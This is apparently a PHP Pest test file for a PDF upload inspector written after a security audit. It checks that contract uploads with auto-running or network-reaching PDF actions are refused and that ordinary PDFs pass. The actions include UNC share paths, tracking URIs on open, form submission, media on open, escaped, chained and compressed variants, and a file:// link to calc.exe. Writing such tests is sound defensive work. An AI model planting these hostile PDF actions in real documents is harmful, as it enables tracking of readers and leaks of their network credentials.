<?php

use App\Models\User;
use App\Support\Uploads\Pdf\PdfInspector;
use App\Support\Uploads\UploadRefused;
use App\Support\Uploads\UploadService;
use Illuminate\Support\Facades\Storage;

/*
 * Audit M2 (proofs/pdf-probe.php and P13): PDFs that act by themselves or reach another machine were accepted.
 * Michael 2026-11-23 decision 2A: refuse actions that run on open and network paths, keep links the reader clicks.
 */

function actionReason(string $bytes): ?string
{
    try {
        (new PdfInspector)->inspect($bytes);

        return null;
    } catch (UploadRefused $e) {
        return $e->reason;
    }
}

/** A one-page PDF with extra keys in the catalog and extra objects. */
function catalogPdf(string $catalogExtra, string $extraObjects = ''): string
{
    $objects = [
        "<< /Type /Catalog /Pages 2 0 R {$catalogExtra} >>",
        '<< /Type /Pages /Kids [3 0 R] /Count 1 >>',
        '<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] >>',
    ];
    $out = "%PDF-1.7\n";
    foreach ($objects as $i => $object) {
        $out .= ($i + 1)." 0 obj\n{$object}\nendobj\n";
    }

    return $out.$extraObjects."xref\n0 1\n0000000000 65535 f \ntrailer\n<< /Size 4 /Root 1 0 R >>\nstartxref\n0\n%%EOF\n";
}

function packed(string $inner, int $first): string
{
    $z = (string) gzcompress($inner);

    return "9 0 obj\n<< /Type /ObjStm /N 1 /First {$first} /Filter /FlateDecode /Length ".strlen($z)." >>\nstream\n{$z}\nendstream\nendobj\n";
}

it('refuses the six actions the audit found accepted', function (string $catalogExtra) {
    expect(actionReason(catalogPdf($catalogExtra)))->toBe('pdf_active');
})->with([
    'remote go-to to a network path' => ['/OpenAction << /S /GoToR /F (\\\\203.0.113.5\\share\\x.pdf) /D [0 /Fit] >>'],
    'web address opened on open' => ['/OpenAction << /S /URI /URI (https://203.0.113.5/track?id=1) >>'],
    'form sent on open' => ['/OpenAction << /S /SubmitForm /F << /FS /URL /F (https://203.0.113.5/x) >> >>'],
    'data imported from a share' => ['/OpenAction << /S /ImportData /F (\\\\203.0.113.5\\a.fdf) >>'],
    'page-open trigger' => ['/AA << /O << /S /URI /URI (https://203.0.113.5/) >> >>'],
    'media on open' => ['/OpenAction << /S /Rendition /R << /C << /D << /F (\\\\203.0.113.5\\m.mp4) >> >> >> >>'],
]);

it('refuses a web address chained after a harmless open action, an escaped name, and an indirect action', function () {
    expect(actionReason(catalogPdf('/OpenAction << /S /GoTo /D [3 0 R /Fit] /Next << /S /URI /URI (https://203.0.113.5/) >> >>')))->toBe('pdf_active')
        ->and(actionReason(catalogPdf('/Open#41ction << /S /URI /URI (https://203.0.113.5/) >>')))->toBe('pdf_active')
        ->and(actionReason(catalogPdf('/OpenAction 5 0 R', "5 0 obj\n<< /S /URI /URI (https://203.0.113.5/) >>\nendobj\n")))->toBe('pdf_active');
});

it('follows an open action into a compressed object stream', function () {
    expect(actionReason(catalogPdf('/OpenAction 10 0 R', packed('10 0 << /S /URI /URI (https://203.0.113.5/) >>', 5))))->toBe('pdf_active')
        ->and(actionReason(catalogPdf('/OpenAction 10 0 R', packed('10 0 [3 0 R /Fit]', 5))))->toBeNull();
});

it('refuses an open action it cannot follow', function () {
    expect(actionReason(catalogPdf('/OpenAction 77 0 R')))->toBe('pdf_unsupported')
        ->and(actionReason(catalogPdf('/OpenAction (odd)')))->toBe('pdf_unsupported');
});

it('refuses a link to a network path or a local file, even one the reader must click', function (string $uri) {
    $link = "4 0 obj\n<< /Type /Annot /Subtype /Link /Rect [0 0 50 50] /A << /S /URI /URI {$uri} >> >>\nendobj\n";

    expect(actionReason(catalogPdf('', $link)))->toBe('pdf_active');
})->with([
    'share path' => ['(\\\\\\\\203.0.113.5\\\\share)'],
    'file address' => ['(file:///C:/Windows/System32/calc.exe)'],
    'smb address' => ['(smb://203.0.113.5/share)'],
    'protocol-relative' => ['(//203.0.113.5/x)'],
    'hex-encoded share path' => ['<5C5C3230332E302E3131332E355C78>'],
]);

it('keeps what a normal contract PDF has: a start page, a go-to, and web or mail links', function () {
    $links = "4 0 obj\n<< /Type /Annot /Subtype /Link /Rect [0 0 50 50] /A << /S /URI /URI (https://www.example-developer.com/units) >> >>\nendobj\n"
        ."5 0 obj\n<< /Type /Annot /Subtype /Link /Rect [0 60 50 90] /A << /S /URI /URI (mailto:sales@example.test) >> >>\nendobj\n";

    expect(actionReason(catalogPdf('/OpenAction [3 0 R /XYZ null null 0]', $links)))->toBeNull()
        ->and(actionReason(catalogPdf('/OpenAction << /S /GoTo /D [3 0 R /FitH 800] >>')))->toBeNull()
        ->and(actionReason(catalogPdf('/OpenAction << /Type /Action /S /Named /N /FirstPage >>')))->toBeNull()
        ->and(actionReason(catalogPdf('/OpenAction 6 0 R', "6 0 obj\n[3 0 R /Fit]\nendobj\n")))->toBeNull();
});

it('the audit proof P13: through the upload API the open-action PDF is now refused and nothing is stored', function () {
    Storage::fake(UploadService::PRIVATE_DISK);
    $seller = User::factory()->create();
    $unit = newDraft($seller);
    $pdf = catalogPdf('/OpenAction << /S /URI /URI (https://203.0.113.5/track?id=1) >>');

    $this->post("/api/v1/me/units/{$unit}/documents", ['type' => 'contract', 'file' => upload('contract.pdf', $pdf, 'application/pdf')], sellerHeaders($seller))
        ->assertStatus(422)->assertJsonPath('reason', 'pdf_active');
    expect(Storage::disk(UploadService::PRIVATE_DISK)->allFiles())->toBe([]);
});
